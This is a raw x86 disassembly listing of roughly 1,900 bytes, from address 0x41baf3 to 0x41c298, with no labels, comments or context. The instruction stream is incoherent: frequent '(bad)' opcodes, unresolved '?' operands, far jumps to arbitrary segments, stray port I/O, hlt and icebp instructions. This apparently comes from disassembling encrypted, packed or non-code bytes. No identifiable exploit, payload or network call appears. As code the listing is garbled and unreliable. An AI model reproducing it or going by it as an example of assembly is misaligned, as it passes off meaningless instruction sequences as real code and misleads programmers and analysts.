  41baf3:	int    0x96
  41baf5:	fst    QWORD PTR [esp+esi*1-0x52]
  41baf9:	out    dx,al
  41bafa:	mov    ebp,0x6c89fba1
  41baff:	loopne 0x41badc
  41bb01:	cmp    BYTE PTR [ebx],ah
  41bb03:	jmp    0xce5d:0x29e62439
  41bb0a:	(bad)  
  41bb0b:	cdq    
  41bb0c:	add    eax,0xd37a468f
  41bb11:	cmp    cl,al
  41bb13:	fld    DWORD PTR [edx+0x474542bf]
  41bb19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb1a:	(bad)
  41bb1e:	adc    eax,0xddb106b7
  41bb23:	stos   DWORD PTR es:[edi],eax
  41bb24:	inc    esp
  41bb25:	cmp    al,0x3f
  41bb27:	ret    
  41bb28:	pop    ds
  41bb29:	xor    ah,BYTE PTR [edx+0x31066a83]
  41bb2f:	jg     0x41bab4
  41bb31:	test   al,0xae
  41bb33:	repnz push cs
  41bb35:	jmp    0x4a5:0x432479c8
  41bb3c:	or     ebx,esi
  41bb3e:	push   esi
  41bb3f:	gs retf 0x8332
  41bb43:	lea    esi,[edi-0x21]
  41bb46:	cld    
  41bb47:	in     eax,dx
  41bb48:	xchg   esp,eax
  41bb49:	push   ebx
  41bb4a:	sbb    bh,bl
  41bb4c:	push   ecx
  41bb4d:	retf   
  41bb4e:	and    cl,BYTE PTR [eax+0x6d]
  41bb51:	inc    esp
  41bb52:	test   cl,dh
  41bb54:	xlat   BYTE PTR ds:[ebx]
  41bb55:	stos   BYTE PTR es:[edi],al
  41bb56:	mov    WORD PTR [eax-0x5f31c11f],?
  41bb5c:	adc    edi,DWORD PTR ds:[edx+0x3a]
  41bb60:	sub    cl,BYTE PTR [eax+0x7c]
  41bb63:	sahf   
  41bb64:	and    BYTE PTR [ebp+0x2b149f5e],cl
  41bb6a:	inc    esi
  41bb6b:	test   eax,0xd4c784a7
  41bb70:	sbb    DWORD PTR ds:0xa468d465,0x8928e6b2
  41bb7a:	hlt    
  41bb7b:	push   edi
  41bb7c:	sub    ebp,DWORD PTR [ecx+0x117d7d37]
  41bb82:	inc    ebx
  41bb83:	mov    BYTE PTR [ecx+0x3e],ch
  41bb86:	or     esp,DWORD PTR [esi+0x21d00c3f]
  41bb8c:	xor    eax,0x408d14f5
  41bb91:	add    eax,DWORD PTR [ebx-0x23]
  41bb94:	stc    
  41bb95:	cdq    
  41bb96:	call   0xd59:0xc00f47df
  41bb9d:	loope  0x41bbf9
  41bb9f:	retf   0x2887
  41bba2:	hlt    
  41bba3:	addr16 xchg edx,eax
  41bba5:	cmp    eax,0x64780cf7
  41bbaa:	sub    BYTE PTR [edx+0x43186def],dl
  41bbb0:	cmc    
  41bbb1:	push   es
  41bbb2:	fcomip st,st(3)
  41bbb4:	out    dx,al
  41bbb5:	ret    
  41bbb6:	cmp    DWORD PTR [edx-0x79],0x2e
  41bbba:	jg     0x41bb74
  41bbbc:	add    eax,0x9a1636b8
  41bbc1:	rep stos DWORD PTR es:[edi],eax
  41bbc3:	pushf  
  41bbc4:	xlat   BYTE PTR ds:[ebx]
  41bbc5:	mov    al,0x97
  41bbc7:	lea    edx,[edx]
  41bbc9:	imul   bh
  41bbcb:	dec    esi
  41bbcc:	inc    ebx
  41bbcd:	rol    BYTE PTR [eax-0x19],1
  41bbd0:	ja     0x41bbfe
  41bbd2:	scas   eax,DWORD PTR es:[edi]
  41bbd3:	popa   
  41bbd4:	mov    gs:0xd5258770,al
  41bbda:	inc    eax
  41bbdb:	into   
  41bbdc:	frstor [edx]
  41bbde:	add    edi,DWORD PTR [edx+ebx*8-0x29248a02]
  41bbe5:	jno    0x41bbdb
  41bbe7:	cli    
  41bbe8:	lods   eax,DWORD PTR ds:[esi]
  41bbe9:	aas    
  41bbea:	aad    0xeb
  41bbec:	pop    edi
  41bbed:	xchg   ebp,eax
  41bbee:	aam    0x35
  41bbf0:	ins    BYTE PTR es:[edi],dx
  41bbf1:	add    DWORD PTR [esi+0x5c],0xf613eb76
  41bbf8:	mov    eax,cs:0x8bfb7c64
  41bbfe:	out    0x74,eax
  41bc00:	adc    BYTE PTR [ecx-0xaead3ba],0x5b
  41bc07:	retf   0x4a36
  41bc0a:	xor    al,0xcb
  41bc0c:	and    bl,cl
  41bc0e:	mov    edx,0xe1fe5d8
  41bc13:	loop   0x41bb9a
  41bc15:	bound  ecx,QWORD PTR ds:0x34ad32f8
  41bc1b:	push   esi
  41bc1c:	mov    BYTE PTR [edx],0xe3
  41bc1f:	ret    
  41bc20:	lea    edi,[eax+0xb]
  41bc23:	aad    0x34
  41bc25:	jg     0x41bbc5
  41bc27:	sti    
  41bc28:	mov    esp,0x9ab4d7e8
  41bc2d:	fistp  DWORD PTR ds:0x3edd2f7a
  41bc33:	std    
  41bc34:	and    eax,DWORD PTR [ecx-0x71]
  41bc37:	pop    esi
  41bc38:	pusha  
  41bc39:	pusha  
  41bc3a:	adc    dh,BYTE PTR [edi]
  41bc3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc3d:	rcl    DWORD PTR ds:0x983be1c,0x17
  41bc44:	stos   DWORD PTR es:[edi],eax
  41bc45:	data16 mov ch,0xb7
  41bc48:	fisub  WORD PTR [edx]
  41bc4a:	fcmovb st,st(6)
  41bc4c:	jb     0x41bc1a
  41bc4e:	xchg   ebp,eax
  41bc4f:	test   eax,0xfbc2b140
  41bc54:	js     0x41bc49
  41bc56:	mov    esi,0x79bb8583
  41bc5b:	dec    esi
  41bc5c:	test   BYTE PTR [edi-0xa],dh
  41bc5f:	sbb    BYTE PTR [eax+0x76],bl
  41bc62:	push   edx
  41bc63:	jns    0x41bbf9
  41bc65:	jg     0x41bc5e
  41bc67:	jmp    0xc192:0x500253e2
  41bc6e:	stos   DWORD PTR es:[edi],eax
  41bc6f:	nop
  41bc70:	mov    esp,0x9ec9be82
  41bc75:	pop    ss
  41bc76:	popa   
  41bc77:	jmp    0x2ea1daf1
  41bc7c:	sub    al,BYTE PTR [ecx-0x41]
  41bc7f:	mov    ch,0x8
  41bc81:	test   DWORD PTR [ebp-0x706fc037],ebp
  41bc87:	dec    edx
  41bc88:	xor    dh,ch
  41bc8a:	xor    ecx,DWORD PTR [ebp+0x4fff98e0]
  41bc90:	add    bh,bl
  41bc92:	or     edx,ebp
  41bc94:	mov    ?,ebp
  41bc96:	dec    esp
  41bc97:	dec    ebx
  41bc98:	mov    al,ds:0x41302850
  41bc9d:	mov    esp,0xabb83942
  41bca2:	pop    edi
  41bca3:	and    eax,0xe55ad410
  41bca8:	cmp    DWORD PTR [ebp+0xd],esp
  41bcab:	mov    ebp,0xd07282ea
  41bcb0:	in     eax,0xb
  41bcb2:	jmp    0x16:0x1b087714
  41bcb9:	push   esp
  41bcba:	repnz fst QWORD PTR [esi-0x50]
  41bcbe:	dec    eax
  41bcbf:	sub    al,0x50
  41bcc1:	dec    esi
  41bcc2:	lods   al,BYTE PTR ds:[esi]
  41bcc3:	mov    esi,0x2c8c9f37
  41bcc8:	and    esp,DWORD PTR [eax+0x774d801c]
  41bcce:	mov    edx,0x387746ca
  41bcd3:	sbb    cl,BYTE PTR [edi]
  41bcd5:	shl    DWORD PTR [ebx-0x4f],0xda
  41bcd9:	push   0xffffffe5
  41bcdb:	rol    bh,1
  41bcdd:	mov    ebp,0x47109ee9
  41bce2:	jl     0x41bcd3
  41bce4:	sbb    eax,0xf20598f0
  41bce9:	(bad)  
  41bcea:	mov    DWORD PTR [ebx],0xb0f94db
  41bcf0:	fnsave [ebx]
  41bcf2:	add    BYTE PTR [esi+0x61038bbe],al
  41bcf8:	aad    0x10
  41bcfa:	cld    
  41bcfb:	dec    eax
  41bcfc:	(bad)  
  41bcfd:	sbb    BYTE PTR [eax],dl
  41bcff:	xchg   BYTE PTR [edi+0x45],dl
  41bd02:	icebp  
  41bd03:	adc    ecx,DWORD PTR [ebx-0x65]
  41bd06:	mov    al,ds:0xbb0aff3
  41bd0b:	mov    edx,0x7f706f8b
  41bd10:	inc    esp
  41bd11:	cmc    
  41bd12:	mov    bh,0x23
  41bd14:	ja     0x41bcc9
  41bd16:	cdq    
  41bd17:	jecxz  0x41bd76
  41bd19:	cmp    eax,0xa5be0e1a
  41bd1e:	loope  0x41bd23
  41bd20:	mov    edx,0x97f3704
  41bd25:	or     al,0x8b
  41bd27:	repz retf 0x51bd
  41bd2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd2c:	cmc    
  41bd2d:	mov    esp,0xb132c519
  41bd32:	and    BYTE PTR [edi+edx*4],0x65
  41bd36:	push   edx
  41bd37:	and    esi,ebp
  41bd39:	out    0x13,al
  41bd3b:	jle    0x41bce5
  41bd3d:	icebp  
  41bd3e:	cs (bad) 
  41bd40:	push   ebx
  41bd41:	xchg   ebp,eax
  41bd42:	std    
  41bd43:	mov    ebx,ebx
  41bd45:	push   ds
  41bd46:	jle    0x41bd41
  41bd48:	mov    ecx,0xad653fab
  41bd4d:	push   DWORD PTR [eax+0x6f]
  41bd50:	das    
  41bd51:	mov    al,BYTE PTR [eax-0x47]
  41bd54:	xchg   ebx,eax
  41bd55:	outs   dx,BYTE PTR ds:[esi]
  41bd56:	cmp    eax,0x7ca4fe81
  41bd5b:	scas   al,BYTE PTR es:[edi]
  41bd5c:	test   esi,ecx
  41bd5e:	jno    0x41bd22
  41bd60:	mov    eax,ds:0x59181f7d
  41bd65:	repnz cmp BYTE PTR [eax-0x30],0x97
  41bd6a:	add    eax,0xd58d012a
  41bd6f:	adc    DWORD PTR [ebx],ecx
  41bd71:	retf   0xb41f
  41bd74:	dec    ebx
  41bd75:	or     eax,0x34884cec
  41bd7a:	sbb    al,0xf
  41bd7c:	cmp    DWORD PTR [edi+0x69c56702],edx
  41bd82:	add    bl,BYTE PTR [edx]
  41bd84:	shl    DWORD PTR [ebp+0x666af8d3],0xa2
  41bd8b:	xlat   BYTE PTR ds:[ebx]
  41bd8c:	(bad)  [ebp+0x7646241d]
  41bd92:	fs adc eax,0xf0f3271c
  41bd98:	lds    eax,FWORD PTR [edi+0x12]
  41bd9b:	inc    esp
  41bd9c:	add    al,0xd3
  41bd9e:	test   DWORD PTR [esi-0x1b367838],esi
  41bda4:	adc    al,0x9e
  41bda6:	cli    
  41bda7:	call   0x95b4:0xe0bb4dcf
  41bdae:	push   esp
  41bdaf:	test   al,0xf7
  41bdb1:	add    BYTE PTR [ecx],dh
  41bdb3:	nop
  41bdb4:	leave  
  41bdb5:	dec    ebx
  41bdb6:	dec    edx
  41bdb7:	ret    
  41bdb8:	xor    dh,BYTE PTR [ebp+0x568d2468]
  41bdbe:	xchg   DWORD PTR [ecx],edx
  41bdc0:	pusha  
  41bdc1:	push   esp
  41bdc2:	sub    BYTE PTR [esi],dh
  41bdc4:	cmp    BYTE PTR [eax+edi*1-0x68],ch
  41bdc8:	mov    ds:0xda78dca6,eax
  41bdcd:	aam    0x79
  41bdcf:	pop    esp
  41bdd0:	in     al,0xe3
  41bdd2:	hlt    
  41bdd3:	pop    edx
  41bdd4:	pop    ebp
  41bdd5:	scas   eax,DWORD PTR es:[edi]
  41bdd6:	sar    BYTE PTR [esi-0x7127a72a],0x12
  41bddd:	test   al,0x8b
  41bddf:	mov    edx,0x8d449ee
  41bde4:	pop    ecx
  41bde5:	xchg   ebp,eax
  41bde6:	push   ebp
  41bde7:	xchg   esi,eax
  41bde8:	(bad)  
  41bde9:	add    al,0xb4
  41bdeb:	rol    BYTE PTR [ebp+edx*1+0x8],1
  41bdef:	ins    DWORD PTR es:[edi],dx
  41bdf0:	sti    
  41bdf1:	xchg   edx,eax
  41bdf2:	sub    eax,0x4ff069a0
  41bdf8:	(bad)  
  41bdfa:	fsub   QWORD PTR [edi]
  41bdfc:	ds jle 0x41be37
  41bdff:	loope  0x41be34
  41be01:	or     al,0xe4
  41be03:	jno    0x41bdef
  41be05:	(bad)  
  41be06:	out    dx,al
  41be07:	mov    cl,0x49
  41be09:	outs   dx,BYTE PTR ds:[esi]
  41be0a:	mov    eax,0x48a58d42
  41be0f:	mov    esi,0x1e11e3f
  41be14:	mov    WORD PTR [ebx+0x7b9fc45d],es
  41be1a:	push   0xa43fdc64
  41be1f:	push   DWORD PTR [esi+0x60]
  41be22:	jmp    0xb12c9c8c
  41be27:	int    0xee
  41be29:	aaa    
  41be2a:	jnp    0x41be56
  41be2c:	stos   DWORD PTR es:[edi],eax
  41be2d:	adc    edx,DWORD PTR [edi]
  41be2f:	mov    cl,0xe
  41be31:	pop    ebp
  41be32:	scas   al,BYTE PTR es:[edi]
  41be33:	dec    ebp
  41be34:	pop    esp
  41be35:	jbe    0x41bea9
  41be37:	sbb    ebp,DWORD PTR [edx-0x43177394]
  41be3d:	and    edx,DWORD PTR [eax+0x16]
  41be40:	pop    ss
  41be41:	(bad)  
  41be42:	push   edx
  41be43:	test   BYTE PTR [ebp+esi*4-0x746bb22b],ah
  41be4a:	sub    al,dl
  41be4c:	scas   al,BYTE PTR es:[edi]
  41be4d:	adc    eax,0xde71071b
  41be52:	jmp    0x41bea2
  41be54:	mov    ebp,gs
  41be56:	and    BYTE PTR [edx-0x5904012a],0xef
  41be5d:	cmp    esi,DWORD PTR [ebx]
  41be5f:	xchg   ebx,eax
  41be60:	fisttp QWORD PTR [ecx+0x524dcac1]
  41be66:	cwde   
  41be67:	(bad)  
  41be68:	mov    dl,al
  41be6a:	std    
  41be6b:	push   edx
  41be6c:	pop    ebp
  41be6d:	adc    BYTE PTR [esi+0x24],0xf8
  41be71:	or     al,0x4f
  41be73:	in     al,0x1b
  41be75:	jmp    0xc829ff83
  41be7a:	mov    eax,0xa8df6015
  41be7f:	cmp    BYTE PTR [edx],0x36
  41be82:	mov    eax,0xb2eb979f
  41be87:	mov    WORD PTR [esi+0x73],gs
  41be8a:	popf   
  41be8b:	sub    eax,0xe448d9c4
  41be90:	mov    bh,0x32
  41be92:	inc    esp
  41be93:	xor    esi,ecx
  41be95:	lods   al,BYTE PTR ds:[esi]
  41be96:	(bad)  
  41be97:	pop    edx
  41be98:	sub    al,0x86
  41be9a:	aaa    
  41be9b:	or     bl,BYTE PTR [ebp+0x3eb23841]
  41bea1:	sbb    ch,al
  41bea3:	cli    
  41bea4:	(bad)  
  41bea5:	jecxz  0x41be7c
  41bea7:	test   al,0x90
  41bea9:	fucomip st,st(2)
  41beab:	aad    0x7f
  41bead:	mov    BYTE PTR [edi],ah
  41beaf:	mov    al,ds:0xf48c1c6f
  41beb4:	fwait
  41beb5:	jb     0x41bf25
  41beb7:	cmc    
  41beb8:	mov    esp,0xd2452eaf
  41bebd:	xor    cl,bl
  41bebf:	sbb    eax,0xe650034e
  41bec4:	dec    edx
  41bec5:	nop
  41bec6:	inc    eax
  41bec7:	js     0x41beef
  41bec9:	hlt    
  41beca:	adc    dh,BYTE PTR [eax+ecx*4]
  41becd:	inc    ebp
  41bece:	sub    ah,ch
  41bed0:	repnz mov dh,0x10
  41bed3:	inc    ebp
  41bed4:	push   eax
  41bed5:	xor    al,0x40
  41bed7:	ja     0x41bf12
  41bed9:	push   cs
  41beda:	(bad)  
  41bedc:	ror    bl,1
  41bede:	jb     0x41be6c
  41bee0:	and    al,dl
  41bee2:	push   edi
  41bee3:	call   0xd446:0xca66d8cf
  41beea:	out    dx,eax
  41beeb:	jae    0x41bf53
  41beed:	loope  0x41bed1
  41beef:	add    al,BYTE PTR [edx-0x338b5071]
  41bef5:	add    edx,DWORD PTR [eax-0x4e0b70c9]
  41befb:	mov    dh,0x32
  41befd:	inc    edx
  41befe:	ins    BYTE PTR es:[edi],dx
  41beff:	lahf   
  41bf00:	inc    ebp
  41bf01:	test   ebp,eax
  41bf03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf04:	aad    0x6c
  41bf06:	ds push edi
  41bf08:	aad    0xe4
  41bf0a:	aam    0x2a
  41bf0c:	(bad)  
  41bf0d:	jns    0x41bf12
  41bf0f:	and    esi,DWORD PTR [edx+0x605ad4ca]
  41bf15:	hlt    
  41bf16:	mov    edi,0x770e49d8
  41bf1b:	iret   
  41bf1c:	and    eax,0x668b24d7
  41bf21:	mov    bl,0xec
  41bf23:	sub    BYTE PTR [eax+0x5666b13a],bl
  41bf29:	aam    0x94
  41bf2b:	adc    al,0xf
  41bf2d:	iret   
  41bf2e:	hlt    
  41bf2f:	push   eax
  41bf30:	xchg   esi,eax
  41bf31:	xor    DWORD PTR [edi+edi*2+0x7d8ee223],esp
  41bf38:	mov    ch,0x78
  41bf3a:	adc    esp,esi
  41bf3c:	loope  0x41bec1
  41bf3e:	sbb    ah,BYTE PTR [esi+0xe29d6df]
  41bf44:	ins    DWORD PTR es:[edi],dx
  41bf45:	imul   esp,eax,0x6f
  41bf48:	cld    
  41bf49:	das    
  41bf4a:	in     al,0x1
  41bf4c:	jmp    0x5bfa:0x3a43af2d
  41bf53:	jnp    0x41bf27
  41bf55:	sub    al,ah
  41bf57:	dec    ecx
  41bf58:	xchg   edi,eax
  41bf59:	xchg   edi,eax
  41bf5a:	mov    ?,WORD PTR [edi]
  41bf5c:	popf   
  41bf5d:	scas   eax,DWORD PTR es:[edi]
  41bf5e:	popf   
  41bf5f:	jb     0x41bf89
  41bf61:	mov    eax,0x62be9089
  41bf66:	outs   dx,BYTE PTR ds:[esi]
  41bf67:	loop   0x41bf03
  41bf69:	xor    eax,0xb14ab59
  41bf6e:	sbb    DWORD PTR [edi-0x59],ecx
  41bf71:	cmp    al,0x37
  41bf73:	mov    ebx,0xeb561d9d
  41bf78:	cmp    eax,eax
  41bf7a:	pop    ebp
  41bf7b:	xchg   edx,eax
  41bf7c:	mov    ?,WORD PTR [ebx]
  41bf7e:	sbb    eax,0x6607ce6f
  41bf83:	frstor [edi]
  41bf85:	out    dx,al
  41bf86:	retf   0x217a
  41bf89:	inc    esi
  41bf8a:	imul   ecx
  41bf8c:	xor    eax,0x3b2acaf5
  41bf91:	cli    
  41bf92:	cmp    al,BYTE PTR [eax+eax*4-0x73]
  41bf96:	daa    
  41bf97:	mov    eax,ds:0x34292ace
  41bf9c:	ror    DWORD PTR [edi+0x2020b837],1
  41bfa2:	cmp    BYTE PTR [esi],cl
  41bfa4:	xchg   edx,eax
  41bfa5:	xchg   bl,al
  41bfa7:	sahf   
  41bfa8:	das    
  41bfa9:	xchg   esp,eax
  41bfaa:	scas   eax,DWORD PTR es:[edi]
  41bfab:	popa   
  41bfac:	xchg   ebp,eax
  41bfad:	stos   DWORD PTR es:[edi],eax
  41bfae:	xchg   edi,esi
  41bfb0:	js     0x41bf54
  41bfb2:	shl    DWORD PTR [ebx],1
  41bfb4:	aam    0xc7
  41bfb6:	mov    al,ds:0xa4c83a3c
  41bfbb:	dec    ebp
  41bfbc:	mov    ebx,0x7c6e2517
  41bfc1:	sbb    eax,0x41e5bef1
  41bfc6:	gs sahf 
  41bfc8:	aas    
  41bfc9:	pop    esi
  41bfca:	aam    0xc7
  41bfcc:	stc    
  41bfcd:	fld    st(4)
  41bfcf:	sub    ebp,DWORD PTR [eax+eax*1]
  41bfd2:	mov    ds:0xa722e7f0,eax
  41bfd7:	out    dx,eax
  41bfd8:	inc    esp
  41bfd9:	mov    ?,bx
  41bfdc:	jecxz  0x41bf88
  41bfde:	xor    BYTE PTR [ebp+0x233191e0],cl
  41bfe4:	outs   dx,DWORD PTR ds:[esi]
  41bfe5:	stos   DWORD PTR es:[edi],eax
  41bfe6:	xor    dh,BYTE PTR [esi]
  41bfe8:	push   ds
  41bfe9:	and    ebx,DWORD PTR [esp+edx*2]
  41bfec:	and    dh,BYTE PTR [esp+ebp*1-0x5f]
  41bff0:	or     bh,dl
  41bff2:	jg     0x41bfef
  41bff4:	and    bl,BYTE PTR [eax]
  41bff6:	jo     0x41c05a
  41bff8:	mov    ds:0x2d09166f,al
  41bffd:	cs test al,0x6d
  41c000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c001:	outs   dx,BYTE PTR ds:[esi]
  41c002:	arpl   WORD PTR [ecx-0x3a],bx
  41c005:	adc    dh,BYTE PTR [eax+0x11d715ee]
  41c00b:	(bad)  
  41c00c:	out    dx,eax
  41c00d:	in     eax,0xd2
  41c00f:	daa    
  41c010:	and    eax,0x258243e3
  41c015:	mov    eax,0xd3bf6526
  41c01a:	neg    cl
  41c01c:	push   esi
  41c01d:	rol    esi,1
  41c01f:	push   ecx
  41c020:	fild   QWORD PTR [edx+eiz*8]
  41c023:	jmp    0x886c4cf8
  41c028:	pop    es
  41c029:	rol    DWORD PTR [ebp-0x52],0xd0
  41c02d:	repz pop edx
  41c02f:	imul   ecx,DWORD PTR [edx+eiz*4],0x9d0b4dfa
  41c036:	push   ecx
  41c037:	dec    edi
  41c038:	in     al,dx
  41c039:	xchg   ecx,eax
  41c03a:	icebp  
  41c03b:	push   0xcad939c2
  41c040:	push   ss
  41c041:	mov    edx,0x8cdcfcc8
  41c046:	add    eax,0xa051b191
  41c04b:	xchg   ebp,eax
  41c04c:	into   
  41c04d:	ja     0x41c00a
  41c04f:	xlat   BYTE PTR ds:[ebx]
  41c050:	aad    0x59
  41c052:	xchg   DWORD PTR [edi+edx*2],esp
  41c055:	mov    ebx,eax
  41c057:	jbe    0x41c096
  41c059:	push   esi
  41c05a:	(bad)  
  41c05b:	xor    eax,0x64326604
  41c060:	jns    0x41c0b4
  41c062:	push   edi
  41c063:	cwde   
  41c064:	adc    ah,BYTE PTR [edi-0x44]
  41c067:	mov    edx,0x468e2489
  41c06c:	mov    bl,0x12
  41c06e:	push   0x44a1d5d2
  41c073:	fs push edi
  41c075:	stos   DWORD PTR es:[edi],eax
  41c076:	in     al,dx
  41c077:	loop   0x41c00b
  41c079:	mov    edi,DWORD PTR [edi+0x68]
  41c07c:	lea    edi,ds:0xfa6498b
  41c082:	or     ebx,DWORD PTR [edi+0xa]
  41c085:	(bad)  
  41c086:	jg     0x41c0fd
  41c088:	fldenv [esi-0x6054fdfc]
  41c08e:	pop    ds
  41c08f:	or     BYTE PTR [esp+ecx*8-0x4d],ah
  41c093:	push   0x34e7c2fe
  41c098:	es and dh,dh
  41c09b:	nop
  41c09c:	and    al,0x88
  41c09e:	shl    BYTE PTR [esi],0xac
  41c0a1:	repnz ins BYTE PTR es:[edi],dx
  41c0a3:	call   0xc6dd:0x4f564213
  41c0aa:	or     ebx,DWORD PTR [edi+0x282037a8]
  41c0b0:	(bad)  
  41c0b1:	push   0xffffffaa
  41c0b3:	push   es
  41c0b4:	pop    eax
  41c0b5:	push   eax
  41c0b6:	jle    0x41c060
  41c0b8:	xor    eax,0xf24cb80f
  41c0bd:	mov    DWORD PTR [esi+0x7b027df5],edi
  41c0c3:	test   al,0x3c
  41c0c5:	mov    ds:0xc25b49af,eax
  41c0ca:	je     0x41c0fc
  41c0cc:	loop   0x41c063
  41c0ce:	cmc    
  41c0cf:	idiv   bl
  41c0d1:	imul   ebp,DWORD PTR [esi+0x60],0x9e21ae73
  41c0d8:	dec    eax
  41c0d9:	imul   esp,DWORD PTR [edi+edi*4-0x4ce8ae84],0xfffffffd
  41c0e1:	inc    eax
  41c0e2:	cmp    DWORD PTR [edx+0x35],edi
  41c0e5:	fcmovbe st,st(1)
  41c0e7:	call   0x99105ad5
  41c0ec:	push   ebp
  41c0ed:	test   BYTE PTR [eax+0x70],0x1e
  41c0f1:	pop    ds
  41c0f2:	lds    eax,FWORD PTR [esi+0x3d9acec3]
  41c0f8:	mov    esi,DWORD PTR [esi-0x1461297d]
  41c0fe:	(bad)  
  41c0ff:	push   edi
  41c100:	or     dh,BYTE PTR [edx]
  41c102:	fs jbe 0x41c0c3
  41c105:	mov    ch,0x62
  41c107:	loopne 0x41c147
  41c109:	jecxz  0x41c0bd
  41c10b:	imul   esp,ebp,0x5aae1d53
  41c111:	clc    
  41c112:	jno    0x41c186
  41c114:	daa    
  41c115:	push   ebx
  41c116:	sti    
  41c117:	out    0xe2,al
  41c119:	outs   dx,BYTE PTR ds:[esi]
  41c11a:	fdivr  QWORD PTR [ebp-0x5df517bd]
  41c120:	aam    0xff
  41c122:	popa   
  41c123:	mov    cl,BYTE PTR [esi+0x1a4cd455]
  41c129:	fld    DWORD PTR [ebp+0x7e3a2f10]
  41c12f:	and    DWORD PTR [eax-0x5f77c8d5],esi
  41c135:	sub    BYTE PTR [eax],cl
  41c137:	in     eax,dx
  41c138:	mov    ebx,0x2c9be116
  41c13d:	sbb    esi,DWORD PTR [ebp-0x30641e88]
  41c143:	jb     0x41c16a
  41c145:	jecxz  0x41c0fc
  41c147:	push   edx
  41c148:	int    0x14
  41c14a:	mov    es,WORD PTR [edi+0x6]
  41c14d:	and    al,0x8
  41c14f:	or     ah,0x2f
  41c152:	retf   0x15fe
  41c155:	js     0x41c124
  41c157:	push   edx
  41c158:	push   esp
  41c159:	push   bx
  41c15b:	dec    esp
  41c15c:	and    eax,DWORD PTR [eax+0x26]
  41c15f:	adc    eax,0xbcbb5100
  41c164:	imul   ebp,DWORD PTR ds:0x5c0f8656,0x48
  41c16b:	in     al,0xda
  41c16d:	jnp    0x41c185
  41c16f:	jno    0x41c170
  41c171:	retf   
  41c172:	sbb    al,0x7f
  41c174:	push   ebp
  41c175:	fnstcw WORD PTR [eax+ebp*4+0x2aba1c82]
  41c17c:	lea    ecx,[eax]
  41c17e:	and    BYTE PTR [ecx+0x62fe8602],bl
  41c184:	cmp    esi,0xd287b23b
  41c18a:	je     0x41c146
  41c18c:	out    dx,eax
  41c18d:	or     al,0x1
  41c18f:	fisttp WORD PTR [esi-0x6c]
  41c192:	(bad)  
  41c194:	(bad)  
  41c195:	xchg   edi,eax
  41c196:	gs inc esp
  41c198:	ins    BYTE PTR es:[edi],dx
  41c199:	push   edx
  41c19a:	dec    esi
  41c19b:	xchg   edx,eax
  41c19c:	push   ds
  41c19d:	mov    bl,0xe4
  41c19f:	cmc    
  41c1a0:	or     DWORD PTR [ecx-0x5424cd9e],ebx
  41c1a6:	pop    ecx
  41c1a7:	cmp    eax,0x1a6608cf
  41c1ac:	scas   eax,DWORD PTR es:[edi]
  41c1ad:	lahf   
  41c1ae:	fs aam 0x3a
  41c1b1:	push   0x109248ce
  41c1b6:	ret    
  41c1b7:	and    bl,ch
  41c1b9:	inc    ecx
  41c1ba:	fldl2t 
  41c1bc:	push   ebp
  41c1bd:	pop    esp
  41c1be:	mov    ebp,0xcc02891c
  41c1c3:	mov    edi,?
  41c1c5:	out    dx,eax
  41c1c6:	test   al,0xa6
  41c1c8:	test   BYTE PTR [esi],ah
  41c1ca:	dec    esi
  41c1cb:	adc    ebp,DWORD PTR [edx+ebp*1]
  41c1ce:	cmp    cl,BYTE PTR [esp+eiz*8]
  41c1d1:	dec    ebx
  41c1d2:	mov    ebx,0x4d6ce2f4
  41c1d7:	aam    0x48
  41c1d9:	jp     0x41c1e9
  41c1db:	or     bh,BYTE PTR [esi-0x67]
  41c1de:	dec    ebx
  41c1df:	add    al,0xf9
  41c1e1:	fs mov ecx,0x2f9ff8a0
  41c1e7:	ja     0x41c19c
  41c1e9:	test   BYTE PTR ds:0x8406713e,bl
  41c1ef:	(bad)  
  41c1f0:	mov    ebx,0x1c48cf46
  41c1f5:	push   ebp
  41c1f6:	loope  0x41c1e9
  41c1f8:	and    ebx,DWORD PTR [edi+0x7cf838d6]
  41c1fe:	jno    0x41c23b
  41c200:	inc    eax
  41c201:	xor    BYTE PTR [ebp-0x58],ch
  41c204:	push   ebx
  41c205:	mov    ch,0xa
  41c207:	mov    al,0xa1
  41c209:	adc    bh,ch
  41c20b:	loop   0x41c197
  41c20d:	(bad)  
  41c20e:	js     0x41c255
  41c210:	cmp    BYTE PTR [eax+0x4f327b85],0xa2
  41c217:	pop    ds
  41c218:	aaa    
  41c219:	pop    ss
  41c21a:	je     0x41c29a
  41c21c:	push   cs
  41c21d:	push   eax
  41c21e:	mov    bl,dl
  41c220:	shl    bl,cl
  41c222:	minps  xmm3,XMMWORD PTR [edi-0x38ae3ab]
  41c229:	inc    ebx
  41c22a:	leave  
  41c22b:	rcr    edx,1
  41c22d:	inc    eax
  41c22e:	mov    ah,0x81
  41c230:	in     al,0x8
  41c232:	push   edx
  41c233:	leave  
  41c234:	iret   
  41c235:	ja     0x41c268
  41c237:	ds push ebx
  41c239:	push   esi
  41c23a:	mov    WORD PTR [eax+edi*1-0x63],gs
  41c23e:	inc    esi
  41c23f:	mov    eax,ds:0x5f72d777
  41c244:	bound  esi,QWORD PTR [ebx+0xb]
  41c247:	imul   esp,DWORD PTR [eax],0x8
  41c24a:	repz loop 0x41c237
  41c24d:	loopne 0x41c2cb
  41c24f:	dec    esi
  41c250:	adc    eax,DWORD PTR [ebx-0xb9ea19f]
  41c256:	xchg   ebp,eax
  41c257:	lea    ecx,[ecx-0x66]
  41c25a:	fs or  eax,0x7b7823b1
  41c260:	inc    edi
  41c261:	pop    esp
  41c262:	data16 aaa 
  41c264:	push   ds
  41c265:	adc    BYTE PTR ds:0x62155418,bh
  41c26b:	add    BYTE PTR [edi+0x46c3f48b],ch
  41c271:	or     DWORD PTR [edx-0x3dc034d9],eax
  41c277:	je     0x41c275
  41c279:	ins    BYTE PTR es:[edi],dx
  41c27a:	hlt    
  41c27b:	stos   DWORD PTR es:[edi],eax
  41c27c:	mov    ch,0xd5
  41c27e:	int    0x2b
  41c280:	cwde   
  41c281:	mov    al,ds:0x43f518d6
  41c286:	shl    ecx,1
  41c288:	pop    es
  41c289:	ja     0x41c217
  41c28b:	xchg   edi,eax
  41c28c:	inc    ebx
  41c28d:	and    bh,BYTE PTR [ecx-0x662bdc6b]
  41c293:	icebp  
  41c294:	retf   0x2041
  41c297:	pop    ebp
  41c298:	outs   dx,BYTE PTR ds:[esi]
